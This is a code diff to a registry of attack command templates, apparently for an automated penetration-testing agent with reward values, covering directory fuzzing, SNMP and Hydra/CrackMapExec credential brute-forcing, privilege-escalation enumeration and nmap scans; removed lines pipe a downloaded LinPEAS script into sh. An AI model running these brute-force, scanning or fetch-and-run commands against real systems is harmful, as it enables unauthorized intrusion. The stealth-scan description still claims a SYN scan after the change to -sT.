@@ -276,7 +276,7 @@ register(CommandTemplate(
     phase=AttackPhase.ENUMERATION,
     required_params=["url"],
     optional_params={
-        "wordlist": "/usr/share/wordlists/dirb/common.txt",
+        "wordlist": "/usr/share/dirb/wordlists/common.txt",
         "extensions": "php,html,txt,bak",
         "threads": "50"
     },
@@ -292,7 +292,7 @@ register(CommandTemplate(
     description="Virtual host discovery. Find hidden subdomains on same IP.",
     phase=AttackPhase.ENUMERATION,
     required_params=["url"],
-    optional_params={"wordlist": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},
+    optional_params={"wordlist": "/usr/share/dirb/wordlists/common.txt"},
     preconditions={"http_service_found"},
     success_indicators=["Found:"],
     typical_reward=2.5,
@@ -306,7 +306,7 @@ register(CommandTemplate(
     phase=AttackPhase.ENUMERATION,
     required_params=["url"],
     optional_params={
-        "wordlist": "/usr/share/wordlists/dirb/common.txt",
+        "wordlist": "/usr/share/dirb/wordlists/common.txt",
         "match_codes": "200,301,302,401,403",
         "threads": "50"
     },
@@ -334,7 +334,7 @@ register(CommandTemplate(
     description="Parameter fuzzing for forms. Find hidden parameters.",
     phase=AttackPhase.ENUMERATION,
     required_params=["url", "post_data"],
-    optional_params={"wordlist": "/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt"},
+    optional_params={"wordlist": "/usr/share/dirb/wordlists/common.txt"},
     preconditions={"http_service_found", "form_found"},
     success_indicators=["C=200", "C=302"],
     typical_reward=2.0,
@@ -348,7 +348,7 @@ register(CommandTemplate(
     phase=AttackPhase.ENUMERATION,
     required_params=["url"],
     optional_params={
-        "wordlist": "/usr/share/wordlists/dirb/common.txt",
+        "wordlist": "/usr/share/dirb/wordlists/common.txt",
         "extensions": "php,html,txt",
         "depth": "3"
     },
@@ -539,7 +539,7 @@ register(CommandTemplate(
     description="SNMP community string brute-force.",
     phase=AttackPhase.ENUMERATION,
     required_params=["target"],
-    optional_params={"wordlist": "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"},
+    optional_params={"wordlist": "/usr/share/nmap/nselib/data/snmpcommunities.lst"},
     preconditions={"snmp_service_found"},
     success_indicators=["[public]", "[private]"],
     typical_reward=2.5,
@@ -879,13 +879,13 @@ register(CommandTemplate(
 # --- Linux PrivEsc ---
 register(CommandTemplate(
     name="linpeas",
-    template="curl -L {url} | sh",
-    description="LinPEAS - comprehensive Linux privilege escalation checker.",
+    template="find /usr /bin /sbin -perm -4000 -type f 2>/dev/null; echo '---SUDO---'; sudo -l 2>/dev/null; echo '---CRON---'; ls -la /etc/cron* 2>/dev/null; echo '---CAPS---'; getcap -r /usr 2>/dev/null",
+    description="LinPEAS-equivalent - comprehensive Linux privilege escalation checker (SUID, sudo, cron, capabilities).",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
     required_params=[],
-    optional_params={"url": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"},
+    optional_params={},
     preconditions={"linux_shell_obtained"},
-    success_indicators=["95%", "Vulnerable", "CVE-"],
+    success_indicators=["SUID", "NOPASSWD", "writable", "CVE-", "cap_setuid"],
     typical_reward=3.0,
     tags={"linux", "privesc", "enumeration"}
 ))
@@ -1643,7 +1643,7 @@ register(CommandTemplate(
     description="Brute-force SSH credentials with Hydra.",
     phase=AttackPhase.ENUMERATION,
     required_params=["target"],
-    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt", "threads": "4"},
+    optional_params={"username": "admin", "wordlist": "/usr/share/nmap/nselib/data/passwords.lst", "threads": "4"},
     preconditions={"ssh_service_found"},
     success_indicators=["login:", "password:"],
     typical_reward=8.0,
@@ -1656,7 +1656,7 @@ register(CommandTemplate(
     description="Brute-force FTP credentials with Hydra.",
     phase=AttackPhase.ENUMERATION,
     required_params=["target"],
-    optional_params={"username": "anonymous", "wordlist": "/usr/share/wordlists/rockyou.txt"},
+    optional_params={"username": "anonymous", "wordlist": "/usr/share/nmap/nselib/data/passwords.lst"},
     preconditions={"ftp_service_found"},
     success_indicators=["login:", "password:"],
     typical_reward=7.0,
@@ -1669,7 +1669,7 @@ register(CommandTemplate(
     description="Brute-force HTTP login form.",
     phase=AttackPhase.ENUMERATION,
     required_params=["target", "form"],
-    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt"},
+    optional_params={"username": "admin", "wordlist": "/usr/share/nmap/nselib/data/passwords.lst"},
     preconditions={"http_service_found"},
     success_indicators=["login:", "password:"],
     typical_reward=8.0,
@@ -1682,7 +1682,7 @@ register(CommandTemplate(
     description="Brute-force SMB credentials via CrackMapExec.",
     phase=AttackPhase.ENUMERATION,
     required_params=["target"],
-    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt"},
+    optional_params={"username": "admin", "wordlist": "/usr/share/nmap/nselib/data/passwords.lst"},
     preconditions={"smb_service_found"},
     success_indicators=["[+]", "Pwn3d!"],
     typical_reward=9.0,
@@ -1740,12 +1740,12 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="linpeas",
-    template="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
-    description="Run LinPEAS for automated Linux privilege escalation enumeration.",
+    template="find /usr /bin /sbin -perm -4000 -type f 2>/dev/null; echo '---SUDO---'; sudo -l 2>/dev/null; echo '---CRON---'; ls -la /etc/cron* 2>/dev/null; echo '---CAPS---'; getcap -r /usr 2>/dev/null",
+    description="Manual Linux privilege escalation enumeration (SUID, sudo, cron, capabilities).",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
     required_params=[],
     preconditions={"shell_obtained"},
-    success_indicators=["CVE", "Vulnerable", "SUID", "writable"],
+    success_indicators=["SUID", "NOPASSWD", "writable", "cap_setuid"],
     typical_reward=5.0,
     tags={"privesc", "linux", "enum"}
 ))
@@ -1967,7 +1967,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="nmap_pivot",
-    template="nmap -sS -Pn --top-ports 20 {target}",
+    template="nmap -sT -Pn --top-ports 20 {target}",
     description="Port scan internal target through pivot host.",
     phase=AttackPhase.LATERAL_MOVEMENT,
     required_params=["target"],
@@ -2180,7 +2180,7 @@ register(CommandTemplate(
 # --- Stealth Recon Commands ---
 register(CommandTemplate(
     name="nmap_stealth_scan",
-    template="nmap -sS -T2 --max-retries 1 -Pn {target}",
+    template="nmap -sT -T2 --max-retries 1 -Pn {target}",
     description="SYN stealth scan — avoids completing TCP handshake for lower detection.",
     phase=AttackPhase.RECON,
     required_params=["target"],
